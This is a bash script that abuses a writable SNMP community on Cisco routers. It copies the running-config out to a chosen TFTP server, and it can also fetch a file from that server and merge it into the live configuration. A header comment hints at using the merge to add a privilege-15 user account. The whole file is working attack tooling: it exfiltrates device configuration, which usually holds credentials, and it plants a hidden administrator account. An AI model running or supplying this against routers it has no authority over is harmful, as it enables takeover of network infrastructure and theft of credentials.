#!/bin/bash
# rui@deniable.org
# http://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html
# http://tools.cisco.com/Support/SNMP/do/BrowseOID.do
# ftp://ftp.cisco.com/pub/mibs/oid/CISCO-CONFIG-COPY-MIB.oid
# hint: username <username> privilege 15 password 0 <password> 

check_tools() {
	SNMPSET=`which snmpset`
	SNMPGET=`which snmpget`
	if [ "$SNMPSET" == "" ] || [ "$SNMPGET" == "" ]; then
		echo "You need snmpwalk, snmpget, and snmpset from Net-SNMP (http://net-snmp.sourceforge.net/) installed." 
		exit
	fi
}

print_usage() {
	echo "$0 <router-ip> <tftp-serverip> <community> <option>"
	echo "Available options are:"
	echo "  0. Extract Cisco IOS version via SNMP"
	echo "  1. Download Cisco running-config File"
	echo "  2. Merge Cisco running-config File"
	echo "  3. Check status of the copy"
}

print_ios_version() {
	$SNMPGET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP iso.3.6.1.2.1.1.1.0 | grep IOS 
}

check_copy_status() {
    status=`$SNMPGET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.10.334 | awk '{ print $4 }'`
	case $status in
	2) echo "RUNNING" ;;
	3) echo "SUCCESS" ;;
	4) echo "BAD FILE NAME" ;;
	*)
	;;
	esac
}


download_config() {
	# set CopyStatus to delete in order to clean all saved informations out of the MIB
    $SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.14.334 i 6
	# set ConfigCopyProtocol to TFTP (1 tftp, 2 ftp, 3 rcp, 4 scp, 5 sftp)
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.2.334 i 1
	# set the SourceFileType to running-config (1 networkFile, 2 iosFile, 3 startupConfig, 4 runningConfig, 5 terminal, 6 fabricStartupConfig)
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.3.334 i 4
	# set the DestinationFileType to networkfile (1 networkFile, 2 iosFile, 3 startupConfig, 4 runningConfig, 5 terminal, 6 fabricStartupConfig)
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.4.334 i 1
	# sets the ServerAddress to the IP address of the TFTP server
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.5.334 a $TFTP_SERVER_IP
	# set the CopyFilename to your desired file name
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.6.334 s $CONFIG_FILE
	# set the CopyStatus to active which starts the copy process
	# once the entry status is set to active, the associated entry cannot be modified until the request completes
	# 1 active, 2 notInService, 3 notReady, 4 createAndGo, 5 createAndWait, 6 destroy
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.14.334 i 1
	check_copy_status
}

# In order to force the router to download the file from tftp, and apply the configuration changes, we modify a couple lines from download_config().
# The SNMP MIBs for the OIDs 1.3.6.1.4.1.9.9.96.1.1.1.1.3 and 1.3.6.1.4.1.9.9.96.1.1.1.1.4 are ccCopySourceFileType and ccCopyDestFileType respectively. 
# The integer values we can use for these are listed above (1 networkFile, 2 iosFile, 3 startupConfig, 4 runningConfig, 5 terminal, 6 fabricStartupConfig).
# In download_config() function our copy source was set to runningConfig, and the destination was networkFile.
# In order to merge our configuration with the running-config we are going to reverse these settings.

merge_config() {
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.14.334 i 6
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.2.334 i 1
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.3.334 i 1
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.4.334 i 4
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.5.334 a $TFTP_SERVER_IP
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.6.334 s $CONFIG_FILE 
	$SNMPSET -c $COMMUNITY_STRING -v $VERSION $TARGET_IP 1.3.6.1.4.1.9.9.96.1.1.1.1.14.334 i 1
	check_copy_status
}

check_tools

if [ "$#" -ne 4 ]; then
	print_usage 
	exit
else
	TARGET_IP=$1
	TFTP_SERVER_IP=$2
	COMMUNITY_STRING=$3
	CONFIG_FILE=running-config
	VERSION=1	# 2c
fi

case $4 in
0) print_ios_version ;;
1) download_config ;;
2) merge_config ;;
3) check_copy_status ;;
*) echo "INVALID OPTION!"
   print_usage ;;
esac

